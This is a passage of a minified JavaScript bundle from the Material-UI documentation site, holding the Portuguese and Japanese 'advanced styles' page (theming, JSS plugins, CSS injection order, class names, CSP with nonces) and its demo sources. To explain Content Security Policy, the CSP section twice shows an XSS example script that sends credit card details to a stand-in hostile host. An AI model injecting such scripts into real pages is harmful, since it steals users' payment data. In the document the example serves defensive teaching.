voc\xea n\xe3o conseguir ver um prefixo espec\xedfico na vers\xe3o mais recente do Chrome. Seu navegador provavelmente n\xe3o precisa disso.\n\n## Pol\xedtica de seguran\xe7a de conte\xfado (CSP)\n\n### O que \xe9 CSP e por que \xe9 \xfatil?\n\nBasicamente, o CSP reduz os ataques de cross-site scripting (XSS) exigindo que os desenvolvedores incluam na whitelist as fontes de onde seus assets s\xe3o recuperados. Esta lista \xe9 retornada como um cabe\xe7alho do servidor. Por exemplo, digamos que voc\xea tenha um site hospedado em `https://example.com` o cabe\xe7alho CSP `default-src: 'self';` permitir\xe1 todos os assets localizados em `https://example.com/*` e negar todos os outros. Se houver uma se\xe7\xe3o do seu site que \xe9 vulner\xe1vel ao XSS, onde a entrada do usu\xe1rio de unescaped \xe9 exibida, um invasor pode inserir algo como:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nEsta vulnerabilidade permitiria que o invasor executasse qualquer coisa. No entanto, com um cabe\xe7alho CSP seguro, o navegador n\xe3o carregar\xe1 esse script.\n\nVoc\xea pode ler mais sobre o CSP no [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Como se implementa o CSP?\n\nPara usar o CSP com Material-UI (e JSS), voc\xea precisa usar um nonce. Um nonce \xe9 uma string gerada aleatoriamente que \xe9 usada apenas uma vez, portanto, voc\xea precisa adicionar um middleware de servidor para gerar um em cada solicita\xe7\xe3o. JSS tem um [\xf3timo tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) sobre como conseguir isso com Express and React Helmet. Para um resumo b\xe1sico, continue lendo.\n\nUm nonce CSP \xe9 uma string codificada na Base 64. Voc\xea pode gerar um assim:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\n\xc9 muito importante que voc\xea use o UUID vers\xe3o 4, pois ele gera uma string **imprevis\xedvel**. Em seguida, voc\xea aplica esse nonce ao cabe\xe7alho do CSP. Um cabe\xe7alho CSP pode ser assim com o nonce aplicado:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nSe voc\xea estiver usando renderiza\xe7\xe3o do lado do servidor(Server-Side Rendering), dever\xe1 passar o nonce na tag `<style>` no servidor.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nEnt\xe3o, voc\xea deve passar este nonce para o JSS para que ele possa adicion\xe1-lo \xe0s tags `<style>` subsequentes.\n\nA maneira como voc\xea faz isso \xe9 passando uma tag `<meta property=\"csp-nonce\" content={nonce} />` no `<head>` do seu HTML. O JSS ir\xe1 ent\xe3o, por conven\xe7\xe3o, procurar por uma tag `<meta property=\"csp-nonce\"` e usar o valor do `content` como um nonce.\n\nVoc\xea deve incluir esse cabe\xe7alho independentemente de o SSR ser usado ou n\xe3o. Aqui est\xe1 um exemplo de como um cabe\xe7alho fict\xedcio poderia parecer:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```"},hDXk:function(e,n){e.exports="import * as React from 'react';\nimport { ThemeProvider, useTheme } from '@material-ui/core/styles';\n\ninterface MyTheme {\n  spacing: string;\n}\n\nfunction DeepChild() {\n  const theme = useTheme<MyTheme>();\n\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n\nexport default function UseTheme() {\n  return (\n    <ThemeProvider<MyTheme>\n      theme={{\n        spacing: '8px',\n      }}\n    >\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},"jN+d":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return l}));var s=t("mXGw"),o=t("yZEQ"),r=s.createElement,i=Object(o.a)({"@global":{".cssjss-advanced-global-root":{height:100,width:100,backgroundColor:"blue"},".cssjss-advanced-global-child":{height:8,backgroundColor:"red"}}}),a=r("div",{className:"cssjss-advanced-global-root"},r("div",{className:"cssjss-advanced-global-child"}));function l(){return i(),a}},kr92:function(e,n){e.exports="import * as React from 'react';\nimport {\n  jssPreset,\n  StylesProvider,\n  makeStyles,\n} from '@material-ui/core/styles';\nimport { create } from 'jss';\nimport jssTemplate from 'jss-plugin-template';\n\nconst jss = create({\n  plugins: [jssTemplate(), ...jssPreset().plugins],\n});\n\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n\nfunction Child() {\n  const classes = useStyles();\n  return (\n    <button type=\"button\" className={classes.root}>\n      String templates\n    </button>\n  );\n}\n\nfunction StringTemplates() {\n  return (\n    <StylesProvider jss={jss}>\n      <Child />\n    </StylesProvider>\n  );\n}\n\nexport default StringTemplates;\n"},qYY6:function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return l}));var s=t("mXGw"),o=t("LMpM"),r=t("h7Hf"),i=s.createElement;var a=i((function(){var e=Object(o.a)();return i("span",null,"spacing ".concat(e.spacing))}),null);function l(){return i(r.a,{theme:{spacing:"8px"}},a)}},rwG6:function(e,n){e.exports="# \u9ad8\u5ea6\u306a\u6a5f\u80fd(Advanced)\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/core/styles.</p>\n\n## \u30c6\u30fc\u30de\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Then, you can access the theme object in style functions.\n\n> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### \u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u5185\u306e\u30c6\u30fc\u30de\u3078\u306e\u30a2\u30af\u30bb\u30b9\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\nFor use in function components:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### \u30cd\u30b9\u30c8\u30c6\u30fc\u30de\n\n\u8907\u6570\u306e\u30c6\u30fc\u30de\u30d7\u30ed\u30d0\u30a4\u30c0\u30fc\u3092\u30cd\u30b9\u30c8\u3067\u304d\u307e\u3059\u3002 \u3053\u308c\u306f\u3001\u4e92\u3044\u306b\u7570\u306a\u308b\u5916\u89b3\u3092\u6301\u3064\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u3055\u307e\u3056\u307e\u306a\u9818\u57df\u3092\u6271\u3046\u3068\u304d\u306b\u975e\u5e38\u306b\u5f79\u7acb\u3061\u307e\u3059\u3002\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\n\u5185\u90e8\u30c6\u30fc\u30de\u306f\u5916\u5074\u306e\u30c6\u30fc\u30de\u3092**\u30aa\u30fc\u30d0\u30fc\u30e9\u30a4\u30c9\u3057\u307e\u3059**\u3002 \u95a2\u6570\u3092\u63d0\u4f9b\u3059\u308b\u3053\u3068\u306b\u3088\u308a\u3001\u5916\u5074\u306e\u30c6\u30fc\u30de\u3092\u62e1\u5f35\u3067\u304d\u307e\u3059\u3002\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### `withStyles`\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## \u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u30ec\u30f3\u30c0\u30ea\u30f3\u30b0\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it\u2019s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Global CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### \u30cf\u30a4\u30d6\u30ea\u30c3\u30c9\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## \u30b3\u30f3\u30c6\u30f3\u30c4\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30dd\u30ea\u30b7\u30fc\uff08CSP\uff09\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### CSP\u306e\u5b9f\u88c5\u65b9\u6cd5\n\nIn order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nYou must include this header regardless of whether or not SSR is used. Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```"},t1Wm:function(e,n,t){(window.__NEXT_P=window.__NEXT_P||[]).push(["/styles/advanced",function(){return t("2FG1")}])},"uQs/":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return c}));var s=t("mXGw"),o=t("PDtE"),r=t("yZEQ"),i=s.createElement,a=Object(r.a)({root:{"&.root":{height:100,width:100,backgroundColor:"blue"},"& .child":{height:8,backgroundColor:"red"}}}),l=i("div",{className:"child"});function c(){var e=a();return i("div",{className:Object(o.a)(e.root,"root")},l)}},w5tn:function(e,n,t){var s={"./GlobalClassName.js":"NLUw","./GlobalClassName.tsx":"1ZeO","./GlobalCss.js":"6c61","./GlobalCss.tsx":"jN+d","./HybridGlobalCss.js":"uQs/","./HybridGlobalCss.tsx":"TunK","./StringTemplates.js":"am8y","./ThemeNesting.js":"4Tsr","./ThemeNesting.tsx":"6iTa","./Theming.js":"K8BI","./Theming.tsx":"7HKs","./UseTheme.js":"qYY6","./UseTheme.tsx":"3Biu","./WithTheme.js":"big6","./WithTheme.tsx":"9SVr"};function o(e){var n=r(e);return t(n)}function r(e){if(!t.o(s,e)){var n=new Error("Cannot find module '"+e+"'");throw n.code="MODULE_NOT_FOUND",n}return s[e]}o.keys=function(){return Object.keys(s)},o.resolve=r,e.exports=o,o.id="w5tn"}},[["t1Wm",0,2,1,3,5,4,6,7,8,9,10,11,12,13,15,16,14,17,18,19,20,22,23,25]]]);